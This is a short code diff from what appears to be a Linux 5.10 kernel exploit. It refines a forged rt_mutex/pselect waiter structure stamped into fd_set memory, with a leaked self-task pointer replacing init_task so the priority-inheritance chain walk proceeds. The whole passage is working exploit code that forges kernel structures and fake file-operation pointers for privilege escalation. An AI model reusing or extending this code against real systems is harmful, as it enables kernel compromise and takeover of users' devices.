@@ -383,6 +383,19 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         g_pi_parent = (uint64_t)fake_fops;
         g_pi_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + misc_off);
       }
+      /*
+       * word6 (task): MUST be the waiter thread's own task — our 5.10
+       * adjust_prio_chain exits at 0x1ed9e0 on waiter->task != task.
+       * jc2_self_task_leak() runs HERE (on the waiter thread, pid=0
+       * context leak) and caches. Fallback init_task = walk exits early
+       * (clean miss, roll-10 class).
+       */
+      uint64_t ghost_task = (uint64_t)init_task;
+      {
+        uintptr_t self_task = jc2_self_task_leak();
+        if (self_task)
+          ghost_task = (uint64_t)self_task;
+      }
       struct pselect_waiter_word jc2_words[] = {
           /* F9360 (SAME KMI) target.h: "5.10: waiter qword 0 overlaps the
            * first fd-set qword" — at shift=0 ALL TEN words are stampable.
@@ -394,7 +407,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           {3, g_pi_parent, "pi_parent"},
           {4, 0, "pi_right"},
           {5, g_pi_left, "pi_left"},
-          {6, (uint64_t)init_task, "task"},
+          {6, ghost_task, "task"},
           {7, ghost_lock, "lock"},
           {8, ghost_prio, "prio"},
           {9, 0, "deadline"},
